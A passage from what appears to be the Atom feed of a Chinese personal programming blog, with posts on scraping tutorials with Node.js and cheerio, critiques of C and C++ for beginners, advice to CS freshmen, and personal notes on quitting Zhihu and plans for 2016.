&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install sync-request&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它的使用方法是：&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var request = require(&amp;#39;sync-request&amp;#39;);&amp;#10;var html = request(method, url, options).getBody().toString();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后我们需要一个解析html树的工具。jsdom可以用，但是它实在是太大，我们可以用cheerio，它提供了类似jquery的api，更加便捷。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install cheerio&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var cheerio = require(&amp;#39;cheerio&amp;#39;);&amp;#10;var $ = cheerio.load(html);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面是抓取菜鸟教程（runoob.com）单部教程的一个例子：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var cheerio = require(&amp;#39;cheerio&amp;#39;);&amp;#10;var request = require(&amp;#39;sync-request&amp;#39;);&amp;#10;var fs = require(&amp;#39;fs&amp;#39;);&amp;#10;&amp;#10;var ofile = fs.openSync(&amp;#39;out.html&amp;#39;, &amp;#39;w&amp;#39;);&amp;#10;&amp;#10;var url = &amp;#39;http://www.runoob.com/html/html-tutorial.html&amp;#39;;&amp;#10;var html = request(&amp;#39;GET&amp;#39;, url).getBody().toString();&amp;#10;&amp;#10;var toc = getToc(html);&amp;#10;for(var i in toc) &amp;#123;&amp;#10;&amp;#9;var url = toc[i];&amp;#10;&amp;#9;console.log(&amp;#39;page: &amp;#39; + url);&amp;#10;&amp;#9;html = request(&amp;#39;GET&amp;#39;, url).getBody().toString();&amp;#10;&amp;#9;var content = getContent(html);&amp;#10;&amp;#9;fs.writeSync(ofile, content, null, &amp;#39;utf-8&amp;#39;);&amp;#10;&amp;#125;&amp;#10;&amp;#10;fs.closeSync(ofile);&amp;#10;console.log(&amp;#39;Done..&amp;#39;);&amp;#10;&amp;#10;function getToc(html)  &amp;#123;&amp;#10;&amp;#10;&amp;#9;var $ = cheerio.load(html);&amp;#10;&amp;#10;&amp;#9;var $list = $(&amp;#39;#leftcolumn&amp;#39;).find(&amp;#39;a&amp;#39;);&amp;#10;&amp;#9;var res = [];&amp;#10;&amp;#9;for(var i = 0; i &amp;#60; $list.length; i++)&amp;#10;&amp;#9;&amp;#123;&amp;#10;&amp;#9;&amp;#9;var url = $list.eq(i).attr(&amp;#39;href&amp;#39;);&amp;#10;&amp;#9;&amp;#9;res.push(&amp;#39;http://www.runoob.com/&amp;#39; + url);&amp;#10;&amp;#9;&amp;#125;&amp;#10;&amp;#9;return res;&amp;#10;&amp;#125;&amp;#10;&amp;#10;function getContent(html) &amp;#123;&amp;#10;&amp;#9;var $ = cheerio.load(html);&amp;#10;&amp;#9;var content = $(&amp;#39;#content&amp;#39;).html();&amp;#10;&amp;#9;return content;&amp;#10;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;node.js自带的http模块是异步获取网页内容的，不过我们可以到npm上去搜索同步的http模块。sync-request就是其中一种。&lt;/p&gt;
&lt;p&gt;首先，安装sync-request包：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;npm install sync-request&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;它的使用方法是：
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>为什么C语言不简单</title>
    <link href="http://www.flygon.net/%E4%B8%BA%E4%BB%80%E4%B9%88C%E8%AF%AD%E8%A8%80%E4%B8%8D%E7%AE%80%E5%8D%95/"/>
    <id>http://www.flygon.net/为什么C语言不简单/</id>
    <published>2016-01-15T11:37:21.000Z</published>
    <updated>2016-02-07T11:38:02.167Z</updated>
    
    <content type="html">&lt;p&gt;很多人都喜欢把C语言推荐给初学者，原因就是C语言语法简单。但是C语言若是用于开发之中，却是最复杂的语言。&lt;/p&gt;
&lt;h2 id=&quot;u5E95_u5C42_u7684__3D_3D__u597D_u7684_uFF1F&quot;&gt;&lt;a href=&quot;#u5E95_u5C42_u7684__3D_3D__u597D_u7684_uFF1F&quot; class=&quot;headerlink&quot; title=&quot;底层的 == 好的？&quot;&gt;&lt;/a&gt;底层的 == 好的？&lt;/h2&gt;&lt;p&gt;C语言提供了对底层的操作，比如指针。但是C语言跟C++最大的不同就是，C语言避不开指针，而C++和用STL和智能指针库完全避开它。也即是说，其它语言的指针只是个类型，C语言的指针就是指针。我一向认为，初学者过早接触指针是个大忌。初学者需要的是做出各种好玩的应用，以此来产生即时反馈，而不是深入研究计算机系统，因为后者只会消磨掉他们的信心。初学者就应该专注于代码逻辑，并且屏蔽掉和底层打交道的一切事物。这么做个比喻吧，如果你刚学化学的时候，就给你讲元素周期律和VSEPR模型，你会感兴趣吗？&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;暴露底层从另外一个角度来说也是有害的，这涉及到手动管理堆中内存。计算机讲究的是一个权衡，你可以说这种方式执行效率高，但是大多数情况下，过度追求执行效率而忽视开发效率是不对的。手动管理内存是高级程序员的事情，初级程序员就应该完全交给语言所带的特性来管理内存，否则，你的程序三天出一个空指针异常，五天出一个内存泄漏，这谁受得了？所以c语言无论从哪点来说，都不适合拿来入门。&lt;/p&gt;
&lt;p&gt;还有一种看法是，只有c语言能接触到栈和堆的模型。我很负责任的告诉你，所有非脚本的编译语言，比如c++和swift，以及托管语言，比如c#和java，都能接触到栈和堆的模型，而且由于有了自动内存管理机制，后者使用堆的频率要远远高于C。脚本语言也有自己的变量容器模型，比如php的zval。这个锅不应该由编程语言来背，而是应该由国产的垃圾教材来背。也可以看出来，c语言的堆栈模型不是放之于四海皆准的，如果拿它去套在其它语言上，可能就行不通。可有些人非要拿它当作学习其他编程语言的基础，真是可笑。&lt;/p&gt;
&lt;h2 id=&quot;u7B80_u5355_u7684_u4EE3_u4EF7&quot;&gt;&lt;a href=&quot;#u7B80_u5355_u7684_u4EE3_u4EF7&quot; class=&quot;headerlink&quot; title=&quot;简单的代价&quot;&gt;&lt;/a&gt;简单的代价&lt;/h2&gt;&lt;p&gt;C语言不提供一些通用组件的高级封装和抽象。比如哈希表，你用的时候完全就得自己造一个，或者上网搜搜看有没现成的代码。这就对开发者很不友好了。由于C语言标准库里面没有这个东西，学的时候完全不会提及，这就导致很多人甚至都不知道有这么个东西，遇到问题的时候就只能干瞪眼了。C语言仅仅支持的容器是原生数组，字符串是用原生字符数组实现的，于是对字符串的处理就非常非常弱。你要是想写个字符串拼接的代码，java里要一行，c语言要好几行。这也就是c语言“简单”带来的代价。&lt;/p&gt;
&lt;p&gt;C语言的简单恰恰是省略掉了OO的原生支持换来的。我上面为什么说是原生支持，是因为C语言还是可以用组合的方式实现OO的，比如继承用组合实现，虚函数用指针函数成员来实现，等等。在OO的方面，C语言实现起来要比C++难得多。C++的一个关键词，对应到C语言又是几行代码，何谈简单呢？OO好也罢，坏也罢，它是现在业界通用的语言范式，其作用就像自然语言中的英语一样，举足轻重。如果不接触一下这个，以后找工作的时候就很吃亏。但是OO真的复杂吗？这些东西，你如果去翻java的书，顶多花两章介绍，一章是类，一章是接口。其它不那么OO的语言干脆就花一章了，就是告诉你有个class，而这些篇幅也差不多是C语言教程中结构和枚举的篇幅。&lt;/p&gt;
&lt;p&gt;C语言的“简单”，就意味着实际开发中，你需要做更多的手动操作来代替编译器。我想上帝是公平的，给了其它语言更多的语言特性，就会同时给他们更高的开发效率。&lt;/p&gt;
&lt;h2 id=&quot;u518D_u8C08_u8C08_u6807_u51C6_u5E93&quot;&gt;&lt;a href=&quot;#u518D_u8C08_u8C08_u6807_u51C6_u5E93&quot; class=&quot;headerlink&quot; title=&quot;再谈谈标准库&quot;&gt;&lt;/a&gt;再谈谈标准库&lt;/h2&gt;&lt;p&gt;C语言书薄的原因，不是因为没有OO那些东西，而是标准库中缺少一些现代化的组件，这些东西可都在posix里。离开posix api谈C语言，就是耍流氓。通用的组件或设施，到了c语言这边，一个都不会少，因为现代的程序运行环境和需求，你离了这些东西，就根本写不出什么来。现代编程语言的五大库（字符串、容器、io、线程、网络），c语言就坑掉两个了。至于后面那两个，C语言开发者不得不去使用posix api，然后再去解决api不兼容问题。以C语言标准库的德性，离了posix就是半残。而如果要了解posix，就得看《apue》。你如果跟我说C语言简单，看完《apue》那一大厚本书，再跟我说简单吧。&lt;/p&gt;
&lt;h2 id=&quot;u4E0D_u662F_u540E_u8BB0_u7684_u540E_u8BB0&quot;&gt;&lt;a href=&quot;#u4E0D_u662F_u540E_u8BB0_u7684_u540E_u8BB0&quot; class=&quot;headerlink&quot; title=&quot;不是后记的后记&quot;&gt;&lt;/a&gt;不是后记的后记&lt;/h2&gt;&lt;p&gt;我们学一门编程语言并不是要拿来应付考试，而是要实际做东西的。像C语言这种没有容器、没有string、没有模板、没有异常、没有RAII，所有轮子自己造，毫无现代编程语言特性的语言，真正用的时候复杂到爆。抱歉，我没有时间去研究每个特性或者类在C语言里怎么实现，我还是喜欢用更简短的代码来表达我的逻辑。&lt;/p&gt;
&lt;p&gt;哪里简单呢？写玩具程序简单吗？&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;很多人都喜欢把C语言推荐给初学者，原因就是C语言语法简单。但是C语言若是用于开发之中，却是最复杂的语言。&lt;/p&gt;
&lt;h2 id=&quot;u5E95_u5C42_u7684__3D_3D__u597D_u7684_uFF1F&quot;&gt;&lt;a href=&quot;#u5E95_u5C42_u7684__3D_3D__u597D_u7684_uFF1F&quot; class=&quot;headerlink&quot; title=&quot;底层的 == 好的？&quot;&gt;&lt;/a&gt;底层的 == 好的？&lt;/h2&gt;&lt;p&gt;C语言提供了对底层的操作，比如指针。但是C语言跟C++最大的不同就是，C语言避不开指针，而C++和用STL和智能指针库完全避开它。也即是说，其它语言的指针只是个类型，C语言的指针就是指针。我一向认为，初学者过早接触指针是个大忌。初学者需要的是做出各种好玩的应用，以此来产生即时反馈，而不是深入研究计算机系统，因为后者只会消磨掉他们的信心。初学者就应该专注于代码逻辑，并且屏蔽掉和底层打交道的一切事物。这么做个比喻吧，如果你刚学化学的时候，就给你讲元素周期律和VSEPR模型，你会感兴趣吗？
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>关于停用知乎账号一事</title>
    <link href="http://www.flygon.net/%E5%85%B3%E4%BA%8E%E5%81%9C%E7%94%A8%E7%9F%A5%E4%B9%8E%E8%B4%A6%E5%8F%B7%E4%B8%80%E4%BA%8B/"/>
    <id>http://www.flygon.net/关于停用知乎账号一事/</id>
    <published>2016-01-10T11:36:31.000Z</published>
    <updated>2016-02-07T11:37:03.216Z</updated>
    
    <content type="html">&lt;p&gt;说实话，申请停用知乎账号很简单，只要给 i@zhihu.com 发一封邮件就可以了。&lt;/p&gt;
&lt;p&gt;我最开始上知乎好像是找什么东西，然后没找到，慢慢就形成了刷知乎的习惯。&lt;/p&gt;
&lt;p&gt;知乎越来越像几年前的天涯，于是我越来越反感。技术根本就是不是一个讨论技术的地方，干货没多少，段子手成群。实质性的回答顶不上去，抖机灵的段子总在最上面。然后是撕逼的现象日益严重，最开始是社科类问题，现在技术类问题也开始撕逼、秀优越。某些用户非常不友善，自己啥都不懂还在评论区瞎扯，骂人不带脏字，可见功力之深厚。&lt;/p&gt;
&lt;p&gt;是时候把它停掉了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;您好！&lt;/p&gt;
&lt;p&gt;根据您的申请，我们会停用您的帐号。感谢您一直以来对知乎的支持。&lt;/p&gt;
&lt;p&gt;感谢您的来信。&lt;/p&gt;
&lt;p&gt;知乎团队&lt;/p&gt;
&lt;p&gt;在 2016年1月9日 下午11:24，龙 &lt;a href=&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#53;&amp;#x36;&amp;#50;&amp;#x38;&amp;#50;&amp;#54;&amp;#49;&amp;#x37;&amp;#x39;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;&quot;&gt;&amp;#53;&amp;#x36;&amp;#50;&amp;#x38;&amp;#50;&amp;#54;&amp;#49;&amp;#x37;&amp;#x39;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;&lt;/a&gt; 写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;申请停用知乎账号&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;说实话，申请停用知乎账号很简单，只要给 i@zhihu.com 发一封邮件就可以了。&lt;/p&gt;
&lt;p&gt;我最开始上知乎好像是找什么东西，然后没找到，慢慢就形成了刷知乎的习惯。&lt;/p&gt;
&lt;p&gt;知乎越来越像几年前的天涯，于是我越来越反感。技术根本就是不是一个讨论技术的地方，干货没多
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>2016 新的展望</title>
    <link href="http://www.flygon.net/2016-%E6%96%B0%E7%9A%84%E5%B1%95%E6%9C%9B/"/>
    <id>http://www.flygon.net/2016-新的展望/</id>
    <published>2016-01-09T11:35:34.000Z</published>
    <updated>2016-02-07T11:36:15.938Z</updated>
    
    <content type="html">&lt;ul&gt;
&lt;li&gt;首先就是翻译几个项目的文档。目前计划是orm2，ejs，nw.js（明明是中国人写的干嘛不提供中文文档），intelij。前面这些都是短小精悍的。还有一个备选项，c++（cplusplus.com），这个的参考手册实在是太长，我就挑常用类翻译好了。其实我觉得一定有必要翻译c++文档，特别是c++11新出来的util，比如时间、复数、随机数、原子和线程、正则，因为有助于推广新的标准。现在vs2015对11的标准支持已经相当不错了，就是国内的教程上面还差点。c++已经有了并发、容器、text、io、fs（tr2）、网络（tr2），还差个进程就能召唤神龙了。&lt;/li&gt;
&lt;li&gt;然后打算写一篇web开发的教程，初步拟定用flask，原因是配置简单，框架较小又能满足全部要求。这个想法是受&lt;a href=&quot;http://lutaf.com/148.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;5天学会一种 web 开发框架&lt;/a&gt;的启发，非IT人士需要实现的想法其实也挺多的，特别是他们可以结合自身领域设计出那个领域的应用，但是，由于他们不懂编程，无法专注于业务逻辑，也免不了和计算机底层打交道的麻烦，所以我就按照web开发的六要素（router，req handler，模板，orm，util，部署）来讲解web开发中抽象的、共性的部分，让他们以后迁移到其他框架时也得心应手。这个如果由于上面那条而没有时间，就拖到明年。&lt;/li&gt;
&lt;li&gt;接下来就是重新捡起来逆向，我以前是玩逆向的，不过那时候玩的是win32，顶多再加上点msil。现在呢，移动应用这么火，对移动应用的逆向分析也变得火了起来。整天搞开发有些无聊，玩玩逆向可以爽一下。&lt;/li&gt;
&lt;li&gt;毕业之后回到北京，也有时间和条件练琴了，希望空闲时间能弹弹琴。&lt;/li&gt;
&lt;li&gt;毕业设计之后，我决定不再碰任何数据分析/挖掘的东西。数据这个岗位，就算以后没有培训班，也有大量统计学的人来竞争，更何况薪资比不上开发（其实也差不多），还要学一大堆数学相关的东西。总之这是个坑，早弃早超生。&lt;/li&gt;
&lt;li&gt;再有就是戒掉知乎，给前面的安排腾出时间。&lt;/li&gt;
&lt;li&gt;再有就是把身体养好。我现在的功率大概是以前的50%吧。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学了四年，最大的感受就是，开发绝对是个保命的技能，是硬通货。你可以说他很low，但是你如果学了编程，学2~3门语言就可以把oo这块通吃了，然后又因为oo是大流，你在哪儿都能找到工作。你可以研究底层啊，图形啊，这类高深的东西，但它们的应用在所有互联网公司里占不到1%。创业公司，也就是需要技术岗来开发一些应用，别的高科技它用不到。你可以研究别的，但是开发这种保命的东西，绝对不可以丢弃。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;首先就是翻译几个项目的文档。目前计划是orm2，ejs，nw.js（明明是中国人写的干嘛不提供中文文档），intelij。前面这些都是短小精悍的。还有一个备选项，c++（cplusplus.com），这个的参考手册实在是太长，我就挑常用类翻译好了。其实我觉得一定
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>给计算机大一新生的建议给计算机大一新生的建议</title>
    <link href="http://www.flygon.net/%E7%BB%99%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%A7%E4%B8%80%E6%96%B0%E7%94%9F%E7%9A%84%E5%BB%BA%E8%AE%AE%E7%BB%99%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%A4%A7%E4%B8%80%E6%96%B0%E7%94%9F%E7%9A%84%E5%BB%BA%E8%AE%AE/"/>
    <id>http://www.flygon.net/给计算机大一新生的建议给计算机大一新生的建议/</id>
    <published>2016-01-08T11:34:29.000Z</published>
    <updated>2016-02-07T11:35:11.365Z</updated>
    
    <content type="html">&lt;p&gt;1. 核心课 （数据结构算法、组原、os、编译、网络（tcp/ip、http部分））一定要弄懂。最好写相关的项目，比如写个parser或者内核什么的都是极好的。&lt;/p&gt;
&lt;p&gt;2. 不要追新的技术，而是追业界普遍使用的技术。比如你追了c#，却发现业界不少由c#转java的；你追了xamarin，也说发现人家还是用java+as开发应用。其实业界还是喜欢久经考验的稳定技术。语言学精一个，了解多个。每种类型的框架（比如前端css，前端js，后端orm，后端mvc，模板引擎）先学一个，其他的需要了边学边用。&lt;/p&gt;
&lt;p&gt;3. 早点去leetcode刷题，国内公司特别爱装逼考算法，不少都是原题，切记。&lt;/p&gt;
&lt;p&gt;4. 注重面向对象，注重架构方面的东西，特别是设计模式，不仅仅是为了可维护性。你以后代码可能是给别人提供支持的，你写的接口很难用的话，天天会被人问候祖宗。&lt;/p&gt;
&lt;p&gt;5. 技术问题学会抛弃百度，使用goole，使用github，使用stackoverflow。学会使用bash和git，特别是后者，备份恢复的时候你就明白了。&lt;/p&gt;
&lt;p&gt;6. 英语达到能阅读原版文档的水平。&lt;/p&gt;
&lt;p&gt;7. 多写代码，有些东西做的多了才能从理性认识向感性飞跃。但不是让你写一万行hello world，也不是让你写一大堆app。你每学一个新的知识，都写个相关的demo出来。你想想你自己写了个http server，虽然实际业务中用不到，面试的时候这么说，然后解释一下自己怎么做的，是不是很爽。&lt;/p&gt;
&lt;p&gt;8. 看书之前先去豆瓣看书评，不要看国产的一些烂书。多看最佳实践，比如effective系列。你一个学生没啥项目经验，又不看别人的最佳实践，写出来的代码能用？&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;1. 核心课 （数据结构算法、组原、os、编译、网络（tcp/ip、http部分））一定要弄懂。最好写相关的项目，比如写个parser或者内核什么的都是极好的。&lt;/p&gt;
&lt;p&gt;2. 不要追新的技术，而是追业界普遍使用的技术。比如你追了c#，却发现业界不少由c#转java的；
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>C++的开发效率真的那么低吗</title>
    <link href="http://www.flygon.net/cpp%E7%9A%84%E5%BC%80%E5%8F%91%E6%95%88%E7%8E%87%E7%9C%9F%E7%9A%84%E9%82%A3%E4%B9%88%E4%BD%8E%E5%90%97/"/>
    <id>http://www.flygon.net/cpp的开发效率真的那么低吗/</id>
    <published>2016-01-07T11:32:14.000Z</published>
    <updated>2016-02-07T11:33:47.099Z</updated>
    
    <content type="html">&lt;p&gt;前几天看到一篇&lt;a href=&quot;http://gladdy.github.io/c++/2015/07/26/NodeDemystified-pt1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;文章&lt;/a&gt;，对比Node.js和C++的，挺有意思。&lt;/p&gt;
&lt;p&gt;大家都知道Node.js开发效率高，下面是它创建server并监听的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var http = require(&amp;#39;http&amp;#39;);&amp;#10;&amp;#10;http.createServer(function(req, res) &amp;#123;&amp;#10;  res.writeHead(200,  &amp;#123;&amp;#39;Content-Type&amp;#39;:  &amp;#39;text/plain&amp;#39;&amp;#125;);&amp;#10;  res.end(&amp;#39;Hello World\n&amp;#39;);&amp;#10;&amp;#125;).listen(8888);&amp;#10;&amp;#10;console.log(&amp;#39;Server running at http://127.0.0.1:8888/&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;可以看出，Node.js原生带有处理http请求相关的库，不像php需要apache托管，并且它的路由设置更加灵活，所以深受广大开发者欢迎。&lt;/p&gt;
&lt;p&gt;上面那段代码用C++11重构一下，暂且就叫做Node++吧。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;using namespace std;&amp;#10;using namespace http;&amp;#10;&amp;#10;...&amp;#10;&amp;#10;HttpServer server([&amp;#38;](HttpRequest &amp;#38;req, HttpResponce &amp;#38;res)&amp;#10;&amp;#123;&amp;#10;  map&amp;#60;string, string&amp;#62; resHdr;&amp;#10;  resHdr[&amp;#34;Content-Type&amp;#34;] = &amp;#34;text/plain&amp;#34;;&amp;#10;  res.writeHead(200, resHdr);&amp;#10;  res.end(&amp;#34;Hello World\n&amp;#34;);&amp;#10;&amp;#125;);&amp;#10;&amp;#10;server.listen(8888);&amp;#10;&amp;#10;cout &amp;#60;&amp;#60; &amp;#34;Server running at http://127.0.0.1:8888/&amp;#34; &amp;#60;&amp;#60; endl;&amp;#10;&amp;#10;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于C++11加入了lambda这一高级特性，使得两段代码在复杂度和长度上是差不多的。&lt;/p&gt;
&lt;p&gt;我不知道现在还鼓吹C++难写难用的人是什么心态。如果其中的确有一部分难用的特性（比如兼容c语言而保留的一些特性），我不知道是什么业务逻辑逼迫你去使用那些东西。我承认有些东西很坑，但它不是C++的全部，你可以不在生产环境中使用啊。你非要什么特性都用一用，然后搞个大新闻，这样简直是为了黑而黑，有什么意思？然而比c++坑的语言有的是。js的原型链和作用域不知道坑了多少人，但丝毫不影响我们拿他表达我们的思想。php的特性坑更多，不照样是web开发的主力吗？&lt;/p&gt;
&lt;p&gt;c++的确为了兼容c保留了很多原始的东西，这部分坑在慢慢填。我们可以看到从最开始的vector和string，到11开始的智能指针以及std::thread、std::atomic，以及std::function和lambda，还有以后即将到来的asio，多了许多替代方案。虽然填的不完整，C++标准宕机了十年，也不是一朝一夕就能赶上的，但是起码是一点一点在改变的。obj-c有arc，我们有智能指针，更好地解放初级程序员的生产力，obj-c有at宏，我们有后缀运算符，更好地使用std::string。c++早就不是十年前的那个c++了。&lt;/p&gt;
&lt;p&gt;然而对于这样一个里程碑，国内的教材显然是保守的。别说新特性了，就默认使用vector和string这条原则，有几本教材做到了？一部分人坚持信奉c++他爹极力反对的“学c++之前先学c”，结果学了一大堆c标准库的东西，之后又需要尽可能忘掉它们。 这样教出来的人，把字符串拼接几条语句能干完的事情，用string.h写了十几条，然后还反过来跟我说字符串处理弱，我就呵呵了。&lt;/p&gt;
&lt;p&gt;可以预见的是，在不久的将来，C++会变成具有现代编程语言特性和设施的这么一种语言。我们完全可以像写Java或者Swift一样写C++。需要注重业务逻辑的时候，使用功能充足的、封装好的标准库和三方库，完全不需要管堆中对象的释放这一回事。虽然这样会使C++的门槛大幅下降，就像现在的iOS培训班那样，但对于一门语言的发展和生态构建，必定是有利的。一些”既得利益者“可能会担心初学者入门过快，而抢了他们的饭碗。如果初学者学几个月就能赶上你，你这几年算是白学了吗？&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;前几天看到一篇&lt;a href=&quot;http://gladdy.github.io/c++/2015/07/26/NodeDemystified-pt1.html&quot;&gt;文章&lt;/a&gt;，对比Node.js和C++的，挺有意思。&lt;/p&gt;
&lt;p&gt;大家都知道Node.js开发效率高，下面是它创建server并监听的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var http = require(&amp;#39;http&amp;#39;);&amp;#10;&amp;#10;http.createServer(function(req, res) &amp;#123;&amp;#10;  res.writeHead(200,  &amp;#123;&amp;#39;Content-Type&amp;#39;:  &amp;#39;text/plain&amp;#39;&amp;#125;);&amp;#10;  res.end(&amp;#39;Hello World\n&amp;#39;);&amp;#10;&amp;#125;).listen(8888);&amp;#10;&amp;#10;console.log(&amp;#39;Server running at http://127.0.0.1:8888/&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="编程" scheme="http://www.flygon.net/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>龙族&amp;天之炽 epub电子书汇总</title>
    <link href="http://www.flygon.net/%E9%BE%99%E6%97%8F-%E5%A4%A9%E4%B9%8B%E7%82%BD-epub%E7%94%B5%E5%AD%90%E4%B9%A6%E6%B1%87%E6%80%BB/"/>
    <id>http://www.flygon.net/龙族-天之炽-epub电子书汇总/</id>
    <published>2016-01-04T11:30:57.000Z</published>
    <updated>2016-02-07T11:32:00.790Z</updated>
    
    <content type="html">&lt;h2 id=&quot;u5185_u5BB9_u6E05_u5355&quot;&gt;&lt;a href=&quot;#u5185_u5BB9_u6E05_u5355&quot; class=&quot;headerlink&quot; title=&quot;内容清单&quot;&gt;&lt;/a&gt;内容清单&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;龙族I·火之晨曦（连载版）&lt;/li&gt;
&lt;li&gt;龙族前传·哀悼之翼&lt;/li&gt;
